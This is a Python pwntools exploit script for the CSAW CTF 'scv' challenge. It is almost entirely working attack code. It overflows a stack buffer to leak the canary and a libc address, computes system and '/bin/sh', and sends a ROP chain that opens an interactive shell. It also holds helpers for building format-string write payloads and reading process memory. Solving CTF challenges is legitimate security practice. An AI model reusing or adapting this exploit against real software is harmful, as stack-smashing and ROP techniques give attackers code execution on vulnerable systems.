#!/usr/bin/python
# encoding: utf-8
from  pwn import *
import time
import sys
binaire='scv'
TIME=0.0
if (len(sys.argv)>1):
    elf=ELF(binaire)
    libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    host='localhost'
    port=59993
else:
    elf=ELF(binaire)
    libc=ELF('libc-2.23.so')
    host='pwn.chal.csaw.io'
    port = 3764

def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s="0"+s
    return(s)


def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8,sg=0):
        n=num
        if ((sg>0) and (n<0)):
            ss="-"
            n=-n
        else:
            ss=""
        s=""
        while (n < 0):
                n = n + (b**nb)
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        while((nb>0) or (n != 0)):
                s=numerals[n % b]+s
                n=n//b
                nb=nb-1
        return ss+s

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s
def word(t):
    p=1
    s=0
    for i in range(4):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def bword(t):
    p=1
    s=0
    for i in range(8):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def complete(t,l,c="\x00"):
    if (len(t)< l):
        return(t+(l-len(t))*c)
    else:
        return(t)


def dumpg(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16),
#        s=s+toprint(buffer[l])
        l=l+8
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",""
    print " "
def dumpgc(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %8 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16)
        l=l+8
#        s=s+toprint(buffer[l])
    print " "

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)
# routine de format

def strl(n,l=5):
    s=str(n)
    s="0"*max(0,l-len(s))+s
    return(s)

def fmt(x):
    if (x < 8):
        return("A"*x)
    return("%"+str(x)+"x")


def lchaine(lwhat,offset,nb=4):
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$hn"
    for c in lnom:
        fm=fmt(c[0]-ind)+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

def lchaineverif(lwhat,offset,nb=4):
    if (nb==4):
        vv='8x'
    else:
        vv='lx'
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$"+vv
    for c in lnom:
        fm="F"*len(fmt(c[0]-ind))+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

debug=1

def pdebug(s):
    if (debug==1):
        print s
    return(s)

def tolibc(s):
    return(libc.sym[s]-libc.sym[reference_libc]+adr_reference_libc)

def adlibc(a):
    return(a-libc.sym[reference_libc]+adr_reference_libc)

def whatis(s):
    print s," = ",hex(tolibc(s))

def pause():
    print "Pause...",
    raw_input()

def isprintable(s):
    for c in s:
        if ((ord(c) < 32) or (ord(c)>126)):
            return(False)
    return(True)
############
def recale():
    p.sendline("\n\n\nRECADRE")
    p.recvuntil("RECADRE\n")

def lire():
    r=p.recvuntil("\n")
    return(r[:r.index("\n")])

def lireoffset(i):
    p.send("%"+str(i)+"$08x\n")
    time.sleep(TIME)
    b=lire()
    return(b[0:8])


def lireptroffset(i):
    global p
    p.send("%"+str(i)+"$s\n")
    time.sleep(TIME)
    try:
        b=lire()
    except:
        b="ERREUR"
    return(b)


def getzone(a):
    p.sendline(p32(a)+"%7$s")
    b=lire()
    return(b)

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)

def waitfor(ch):
    b=p.recv(65800)
    found=0
    print len(b),
    while(found == 0):
        try:
            if (b.index(ch)>=0):
                found=1
        except:
            b=p.recv(65800,5)
            if (len(b)==0):
                found=1
            else:
                found=0
            
def envoi(s):
    pdebug("envoi de "+s)
    p.send(s+"\n\n\n")
    while(len(p.recv(4096,1))>0):
        time.sleep(TIME)
    p.send("GLOP\n")
    time.sleep(TIME)
    p.recvuntil("GLOP")


####################
p=remote(host,port)

def waitmenu():
    return(p.recvuntil('>>'))

waitmenu()
p.sendline("1")
waitmenu()
entete='A'*168
p.sendline(entete)

print waitmenu()
p.sendline("2")
b=waitmenu()

index=b.index(entete)+len(entete)+1
canari=bword("\x00"+b[index:index+7])
print "[+] canari=",hex(canari)

entete2="A"*(168+8+8)

#print entete2

p.sendline("1")
waitmenu()
p.send(entete2+chr(4))

print waitmenu()
p.sendline("2")
b=waitmenu()

index=b.index(entete2)+len(entete2)
leak=bword(complete(b[index:index+6],8))
print "[+] leak libc=",hex(leak)

reference_libc='__libc_start_main'
adr_reference_libc=(leak & 0xfffffffffffff000) + (libc.sym[reference_libc] & 0xfff)

whatis('system')
system=tolibc('system')
binsh=adlibc(libc.data.index("/bin/sh\x00"))

print '[+] binsh=',hex(binsh)

entete3="A"*(168+8+8+8+8)

#print entete3

p.sendline("1")
waitmenu()
p.send(entete3+chr(4))

print waitmenu()
p.sendline("2")
b=waitmenu()

index=b.index(entete3)+len(entete3)
pile=bword(complete(b[index:index+6],8))

print "[+] pile=",hex(pile)



poprdi=0x0000000000400ea3 # : pop rdi ; ret
#pause()
pile='A'*168+p64(canari)+p64(pile)+p64(poprdi)+p64(binsh)+p64(system)+chr(4)


p.sendline("1")
waitmenu()
p.send(pile)
waitmenu()
p.sendline("3")

p.interactive()


